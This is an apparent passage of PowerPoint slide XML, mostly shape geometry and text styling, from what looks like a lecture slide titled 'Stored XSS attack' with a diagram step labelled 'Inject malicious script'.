              <a:gd name="T32" fmla="*/ 137 w 471170"/>
              <a:gd name="T33" fmla="*/ 1640 h 471170"/>
              <a:gd name="T34" fmla="*/ 77 w 471170"/>
              <a:gd name="T35" fmla="*/ 1489 h 471170"/>
              <a:gd name="T36" fmla="*/ 34 w 471170"/>
              <a:gd name="T37" fmla="*/ 1322 h 471170"/>
              <a:gd name="T38" fmla="*/ 9 w 471170"/>
              <a:gd name="T39" fmla="*/ 1145 h 471170"/>
              <a:gd name="T40" fmla="*/ 0 w 471170"/>
              <a:gd name="T41" fmla="*/ 961 h 471170"/>
              <a:gd name="T42" fmla="*/ 9 w 471170"/>
              <a:gd name="T43" fmla="*/ 778 h 471170"/>
              <a:gd name="T44" fmla="*/ 34 w 471170"/>
              <a:gd name="T45" fmla="*/ 600 h 471170"/>
              <a:gd name="T46" fmla="*/ 77 w 471170"/>
              <a:gd name="T47" fmla="*/ 433 h 471170"/>
              <a:gd name="T48" fmla="*/ 137 w 471170"/>
              <a:gd name="T49" fmla="*/ 281 h 471170"/>
              <a:gd name="T50" fmla="*/ 210 w 471170"/>
              <a:gd name="T51" fmla="*/ 158 h 471170"/>
              <a:gd name="T52" fmla="*/ 291 w 471170"/>
              <a:gd name="T53" fmla="*/ 70 h 471170"/>
              <a:gd name="T54" fmla="*/ 377 w 471170"/>
              <a:gd name="T55" fmla="*/ 17 h 471170"/>
              <a:gd name="T56" fmla="*/ 466 w 471170"/>
              <a:gd name="T57" fmla="*/ 0 h 471170"/>
              <a:gd name="T58" fmla="*/ 556 w 471170"/>
              <a:gd name="T59" fmla="*/ 17 h 471170"/>
              <a:gd name="T60" fmla="*/ 642 w 471170"/>
              <a:gd name="T61" fmla="*/ 70 h 471170"/>
              <a:gd name="T62" fmla="*/ 723 w 471170"/>
              <a:gd name="T63" fmla="*/ 158 h 471170"/>
              <a:gd name="T64" fmla="*/ 796 w 471170"/>
              <a:gd name="T65" fmla="*/ 281 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="401862" y="68948"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="432027" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470810" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="466501" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="453573" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="432027" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="470810"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="466501"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="453573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="432027"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="401862"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="364933"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="323988"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="280366"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="235405"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4309" y="190444"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17237" y="146822"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38783" y="105877"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68948" y="68948"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105877" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146822" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="190444" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="235405" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280366" y="4309"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="323988" y="17237"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="364933" y="38783"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401862" y="68948"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161809" name="object 17"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8072439" y="2910729"/>
            <a:ext cx="1318091" cy="12850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58738">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2846"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2471">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2262"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inject</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>malicious  script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161810" name="object 18"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8110258" y="5427850"/>
            <a:ext cx="334776" cy="320768"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId7"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161811" name="object 19"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="282949" cy="267540"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId8"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161812" name="object 20"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="284350" cy="267540"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 415290"/>
              <a:gd name="T1" fmla="*/ 0 h 379729"/>
              <a:gd name="T2" fmla="*/ 944 w 415290"/>
              <a:gd name="T3" fmla="*/ 0 h 379729"/>
              <a:gd name="T4" fmla="*/ 944 w 415290"/>
              <a:gd name="T5" fmla="*/ 1713 h 379729"/>
              <a:gd name="T6" fmla="*/ 0 w 415290"/>
              <a:gd name="T7" fmla="*/ 1713 h 379729"/>
              <a:gd name="T8" fmla="*/ 0 w 415290"/>
              <a:gd name="T9" fmla="*/ 0 h 3797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15290" h="379729">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="415086" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415086" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27974302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295931" y="71438"/>
            <a:ext cx="5593136" cy="678968"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr spc="-21" dirty="0"/>
              <a:t>Stored </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-311" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-11" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="49" dirty="0"/>
              <a:t>attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162819" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2794468" y="2996174"/>
            <a:ext cx="1294279" cy="1392331"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162820" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="3004578"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defRPr>
                <a:solidFill>
